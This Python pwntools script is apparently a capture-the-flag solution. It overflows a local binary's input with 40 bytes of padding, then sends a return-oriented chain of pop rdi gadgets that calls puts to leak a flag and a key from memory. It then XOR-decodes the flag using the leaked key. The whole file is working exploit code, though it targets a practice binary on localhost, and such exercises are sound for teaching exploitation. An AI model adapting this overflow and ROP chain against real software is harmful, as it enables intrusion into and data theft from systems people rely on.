from pwn import *

binary = args.BIN

e = context.binary = ELF(binary)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(args.BIN, gdbscript=gs, stdin=PTY)
    elif args.REMOTE:
        return remote("localhost", 1337)
    else:
        return process(e.path, stdin=PTY)


p = start()

pop_rdi = 0x000000000040119a
ret = 0x000000000040101a

flag_addr = 0x404080
key_addr = 0x4040bc

p.recvuntil(b'>>> ')
p.sendline(flat(
  b'a'*40,
  pop_rdi, flag_addr,
  e.sym['puts'],
  pop_rdi, key_addr,
  e.sym['puts']
))

flag = p.recvline().strip()
key = int.from_bytes(p.recvline().strip(), 'big')
print(flag)
print(key)

key -= len(flag)
flag = bytearray(flag)
for i in range(len(flag)):
    flag[i] = flag[i] ^ key
    key += 1
print(flag.decode())